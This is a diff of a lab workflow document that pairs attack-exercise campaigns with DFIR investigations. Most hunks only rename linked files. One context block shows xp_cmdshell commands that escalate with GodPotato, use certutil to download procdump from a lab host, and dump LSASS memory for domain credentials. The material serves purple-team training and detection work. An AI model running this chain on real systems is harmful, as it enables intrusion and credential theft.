@@ -1,8 +1,8 @@
 # DFIR-Nexus Pioneer Workflow — Campaign ↔ Investigation Bridge
 
-> **Purpose:** Run attack exercises (`CAMPAIGNS.md`) and DFIR investigations (`tools/dfir-nexus/`) in parallel. Each row links live lab telemetry to a DFIR-Nexus case, `tracker.md` PRIMARY source, and (later) Sigma rules.
+> **Purpose:** Run attack exercises (`CAMPAIGNS_v3.md`) and DFIR investigations (`tools/dfir-nexus/`) in parallel. Each row links live lab telemetry to a DFIR-Nexus case, `tracker.md` PRIMARY source, and (later) Sigma rules.
 >
-> **Attack narrative:** [`CAMPAIGNS.md`](CAMPAIGNS.md) · **Playbook refs:** [`CAMPAIGNS-METADATA.md`](CAMPAIGNS-METADATA.md) · **Research backlog:** [`Campaign_suggestions.md`](Campaign_suggestions.md)
+> **Attack narrative:** [`CAMPAIGNS_v3.md`](CAMPAIGNS_v3.md) · **Playbook refs:** [`CAMPAIGNS-METADATA-v2.md`](CAMPAIGNS-METADATA-v2.md) · **Research backlog:** [`Campaign_suggestions.md`](Campaign_suggestions.md)
 >
 > **DFIR tool:** [`tools/dfir-nexus/`](../../tools/dfir-nexus/) (v1.0.0 E.0 Constellation) · **Release docs:** [`E0-CONSTELLATION.md`](../../tools/dfir-nexus/docs/E0-CONSTELLATION.md) · [`D0-STELLAR.md`](../../tools/dfir-nexus/docs/D0-STELLAR.md) · [`C0-VOYAGER.md`](../../tools/dfir-nexus/docs/C0-VOYAGER.md) · **Roadmap:** [`dfir-nexus-source-assessment-3-roadmap.md`](../../docs/internal/integrations/dfir-nexus-source-assessment-3-roadmap.md)
 >
@@ -515,7 +515,7 @@ After completing the spine:
 
 **Goal:** Domain creds for SharpHound / Phase 4 BloodHound as `analyst_cloud`.
 
-**Campaign detail:** [`CAMPAIGNS.md` § Branch 3.5](CAMPAIGNS.md#branch-35--credential-theft-from-system)
+**Campaign detail:** [`CAMPAIGNS_v3.md` § Branch 3.5](CAMPAIGNS_v3.md#branch-35--credential-theft-from-system)
 
 **Recommended execution order:** `3.5F` → `3.5A` → `3.5G` → `3.5H` → `3.5B` → `3.5C` → `3.5D` → `3.5E` → optional `3.5J`–`3.5M`
 
@@ -546,7 +546,7 @@ After completing the spine:
 ```sql
 EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c certutil -urlcache -split -f http://192.168.77.60:8080/procdump.exe C:\Users\Public\procdump.exe"';
 EXEC xp_cmdshell 'C:\Users\Public\GodPotato.exe -cmd "cmd /c C:\Users\Public\procdump.exe -accepteula -ma lsass.exe C:\Users\Public\ls.dmp"';
--- Fallback: schtasks /ru SYSTEM (see CAMPAIGNS.md)
+-- Fallback: schtasks /ru SYSTEM (see CAMPAIGNS_v3.md)
 ```
 
 **DFIR finding (draft):**
@@ -949,8 +949,8 @@ shutil.make_archive(
 
 | Doc | Role |
 |:----|:-----|
-| [`CAMPAIGNS.md`](CAMPAIGNS.md) | Attack narrative and commands |
-| [`CAMPAIGNS-METADATA.md`](CAMPAIGNS-METADATA.md) | Per-attack playbook refs and telemetry |
+| [`CAMPAIGNS_v3.md`](CAMPAIGNS_v3.md) | Attack narrative and commands |
+| [`CAMPAIGNS-METADATA-v2.md`](CAMPAIGNS-METADATA-v2.md) | Per-attack playbook refs and telemetry |
 | [`Campaign_suggestions.md`](Campaign_suggestions.md) | Research → campaign promotion |
 | [`tools/dfir-nexus/docs/SUMMARY.md`](../../tools/dfir-nexus/docs/SUMMARY.md) | One-page feature list (read first) |
 | [`tools/dfir-nexus/docs/USAGE-GUIDE.md`](../../tools/dfir-nexus/docs/USAGE-GUIDE.md) | Install + first-run + walkthroughs (start here) |
